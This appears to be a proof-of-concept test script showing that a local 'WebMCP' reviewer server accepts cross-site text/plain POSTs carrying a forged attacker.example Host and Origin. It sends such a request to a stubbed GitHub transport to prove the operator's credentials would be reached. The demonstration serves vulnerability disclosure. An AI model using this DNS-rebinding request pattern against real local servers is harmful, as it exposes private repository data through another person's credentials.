"""nexus-opencli-reviewer WebMCP pilot: no Host/Origin/Content-Type validation.
A cross-site 'simple' POST (text/plain, foreign Origin, rebinding Host) is served
with the operator's GitHub transport (DNS-rebinding read of private PR metadata)."""
import http.client, json, sys
sys.path.insert(0, "/home/user/nexus-opencli-reviewer")
from reviewer.webmcp import WebMCPServer

class T:  # stands in for GhCliTransport (operator's gh credentials)
    calls = []
    def __getattr__(self, name):
        def f(*a, **k):
            T.calls.append(name); raise RuntimeError("transport reached: " + name)
        return f

srv = WebMCPServer(T()); srv.serve_in_thread()
c = http.client.HTTPConnection("127.0.0.1", srv.port)
c.request("POST", "/tool/inspect_pr", body=json.dumps({"repository": "victim/private", "pr_number": 1}),
          headers={"Host": "attacker.example:%d" % srv.port, "Origin": "http://attacker.example",
                   "Content-Type": "text/plain"})
r = c.getresponse(); print("status:", r.status, "body:", r.read()[:120])
print("operator transport invoked:", T.calls[:3])
srv.shutdown()
